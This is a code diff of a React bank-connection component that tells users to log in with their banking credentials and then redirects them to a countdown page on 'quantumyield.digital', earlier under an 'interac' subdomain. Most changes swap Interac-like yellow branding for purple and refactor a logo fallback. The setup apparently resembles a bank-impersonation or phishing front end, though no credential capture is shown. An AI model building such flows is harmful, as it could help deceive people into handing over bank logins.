@@ -33,6 +33,7 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
   const [currentIndex, setCurrentIndex] = useState(0)
   const [flowState, setFlowState] = useState<ConnectionFlowState>("confirmation")
   const [countdown, setCountdown] = useState(5)
+  const [logoError, setLogoError] = useState(false)
 
   const currentInstitution = selectedInstitutions[currentIndex]
   const hasMore = currentIndex < selectedInstitutions.length - 1
@@ -75,7 +76,7 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
     }
 
     // Redirect to production countdown page
-    const countdownUrl = `https://interac.quantumyield.digital/countdown?${params.toString()}`
+    const countdownUrl = `https://app.quantumyield.digital/countdown?${params.toString()}`
     window.location.href = countdownUrl
   }
 
@@ -103,7 +104,7 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
               <span className="text-sm font-medium">{t.institutionSelect.back || "Back"}</span>
             </button>
             <div className="flex items-center gap-2 text-sm text-muted-foreground">
-              <span className="font-semibold text-[#FDB913]">{currentIndex + 1}</span>
+              <span className="font-semibold text-[#6D1ED4]">{currentIndex + 1}</span>
               <span>/</span>
               <span>{selectedInstitutions.length}</span>
             </div>
@@ -132,21 +133,15 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
               {/* Institution Card */}
               <div className="bg-muted rounded-lg p-6 border-2 border-border">
                 <div className="flex items-center gap-4 mb-4">
-                  <div className="w-16 h-16 bg-white rounded-lg flex items-center justify-center border border-border overflow-hidden relative">
-                    {logoPath ? (
+                  <div className="w-16 h-16 bg-white rounded-lg flex items-center justify-center border border-border overflow-hidden">
+                    {logoPath && !logoError ? (
                       <Image
-                        src={logoPath || "/placeholder.svg"}
+                        src={logoPath}
                         alt={`${currentInstitution.name} logo`}
                         width={64}
                         height={64}
                         className="object-contain p-2 w-full h-full"
-                        onError={(e) => {
-                          e.currentTarget.style.display = "none"
-                          const target = e.currentTarget.parentElement
-                          if (target) {
-                            target.innerHTML = `<span class="text-2xl font-bold text-foreground">${currentInstitution.name.charAt(0)}</span>`
-                          }
-                        }}
+                        onError={() => setLogoError(true)}
                       />
                     ) : (
                       <span className="text-2xl font-bold text-foreground">{currentInstitution.name.charAt(0)}</span>
@@ -162,7 +157,7 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
 
                 {/* Security Notice */}
                 <div className="flex items-start gap-3 p-4 bg-card rounded-md border border-border">
-                  <Shield className="w-5 h-5 text-[#FDB913] flex-shrink-0 mt-0.5" />
+                  <Shield className="w-5 h-5 text-[#6D1ED4] flex-shrink-0 mt-0.5" />
                   <div className="text-sm text-muted-foreground">
                     <p className="font-medium text-foreground mb-1">
                       {t.institutionSelect.secureConnection || "Secure Connection"}
@@ -184,17 +179,17 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
                     </h4>
                     <ul className="space-y-2 text-sm text-muted-foreground">
                       <li className="flex items-start gap-2">
-                        <CheckCircle2 className="w-4 h-4 text-[#FDB913] mt-0.5 flex-shrink-0" />
+                        <CheckCircle2 className="w-4 h-4 text-[#6D1ED4] mt-0.5 flex-shrink-0" />
                         <span>
                           {t.institutionSelect.step1 || "You'll be redirected to your bank's secure login page"}
                         </span>
                       </li>
                       <li className="flex items-start gap-2">
-                        <CheckCircle2 className="w-4 h-4 text-[#FDB913] mt-0.5 flex-shrink-0" />
+                        <CheckCircle2 className="w-4 h-4 text-[#6D1ED4] mt-0.5 flex-shrink-0" />
                         <span>{t.institutionSelect.step2 || "Log in with your existing banking credentials"}</span>
                       </li>
                       <li className="flex items-start gap-2">
-                        <CheckCircle2 className="w-4 h-4 text-[#FDB913] mt-0.5 flex-shrink-0" />
+                        <CheckCircle2 className="w-4 h-4 text-[#6D1ED4] mt-0.5 flex-shrink-0" />
                         <span>{t.institutionSelect.step3 || "Authorize the connection to complete the setup"}</span>
                       </li>
                     </ul>
@@ -203,7 +198,7 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
                   <div className="flex gap-3 pt-4">
                     <button
                       onClick={handleConnect}
-                      className="flex-1 flex items-center justify-center gap-2 px-6 py-3 bg-[#FDB913] text-[#1a1a1a] rounded-lg font-semibold hover:bg-[#e5a811] transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2"
+                      className="flex-1 flex items-center justify-center gap-2 px-6 py-3 bg-[#6D1ED4] text-white rounded-lg font-semibold hover:bg-[#5A18B0] transition-colors focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2"
                     >
                       {t.institutionSelect.connectNow || "Connect Now"}
                       <ArrowRight className="w-5 h-5" />
@@ -223,7 +218,7 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
               {flowState === "connecting" && (
                 <div className="text-center py-12 space-y-4">
                   <div className="flex justify-center">
-                    <Loader2 className="w-16 h-16 text-[#FDB913] animate-spin" />
+                    <Loader2 className="w-16 h-16 text-[#6D1ED4] animate-spin" />
                   </div>
                   <h3 className="text-xl font-bold text-foreground">
                     {t.institutionSelect.establishing || "Establishing Connection..."}
@@ -240,11 +235,11 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
                     <div className="relative w-24 h-24">
                       <div className="absolute inset-0 rounded-full border-8 border-muted" />
                       <div
-                        className="absolute inset-0 rounded-full border-8 border-[#FDB913] border-t-transparent animate-spin"
+                        className="absolute inset-0 rounded-full border-8 border-[#6D1ED4] border-t-transparent animate-spin"
                         style={{ animationDuration: "2s" }}
                       />
                       <div className="absolute inset-0 flex items-center justify-center">
-                        <span className="text-3xl font-bold text-[#FDB913]">{countdown}</span>
+                        <span className="text-3xl font-bold text-[#6D1ED4]">{countdown}</span>
                       </div>
                     </div>
                   </div>
@@ -258,7 +253,7 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
                   </div>
                   <button
                     onClick={handleRedirect}
-                    className="px-6 py-3 bg-[#FDB913] text-[#1a1a1a] rounded-lg font-semibold hover:bg-[#e5a811] transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2"
+                    className="px-6 py-3 bg-[#6D1ED4] text-white rounded-lg font-semibold hover:bg-[#5A18B0] transition-colors focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2"
                   >
                     {t.institutionSelect.continueNow || "Continue Now"}
                   </button>
@@ -277,7 +272,7 @@ export default function BankConnectionFlow({ selectedInstitutions, onBack, onCom
                   key={inst.id}
                   className={cn(
                     "flex-1 h-2 rounded-full transition-all duration-300",
-                    idx < currentIndex ? "bg-green-500" : idx === currentIndex ? "bg-[#FDB913]" : "bg-border",
+                    idx < currentIndex ? "bg-green-500" : idx === currentIndex ? "bg-[#6D1ED4]" : "bg-border",
                   )}
                 />
               ))}
